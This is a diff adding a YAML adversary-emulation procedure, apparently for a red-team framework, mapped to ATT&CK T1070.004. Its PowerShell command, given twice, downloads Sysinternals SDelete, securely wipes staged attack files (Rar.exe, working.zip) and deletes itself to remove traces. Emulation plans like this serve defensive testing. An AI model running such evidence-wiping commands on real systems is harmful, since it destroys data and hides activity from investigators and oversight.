@@ -1,0 +1,54 @@
+- id: 208b021b-c79a-4176-8ad1-3af99ed50c6f
+  name: Artifact Cleanup - Delete Staged Files
+  description: Cleanup files related to Operation
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  cti_source: "https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments"
+  procedure_group: procedure_def_evasion
+  procedure_step: "9.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
+            mkdir "C:\Program Files\SysInternalsSuite";
+          }
+          set-location "C:\Program Files\SysInternalsSuite";
+
+          if (!$(test-path -path "sdelete64.exe")) {
+            iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
+            Expand-Archive sdelete64.zip -force;
+          }
+          copy sdelete64.exe C:\Windows\Temp\;
+          cd C:\Windows\Temp\ ;
+          .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+          .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+          .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+          remove-item C:\Windows\Temp\sdelete64.exe -force;
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+  executors:
+  - name: powershell
+    command: |
+      if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
+        mkdir "C:\Program Files\SysInternalsSuite";
+      }
+      set-location "C:\Program Files\SysInternalsSuite";
+
+      if (!$(test-path -path "sdelete64.exe")) {
+        iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
+        Expand-Archive sdelete64.zip -force;
+      }
+      copy sdelete64.exe C:\Windows\Temp\;
+      cd C:\Windows\Temp\ ;
+      .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+      .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+      .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+      remove-item C:\Windows\Temp\sdelete64.exe -force;
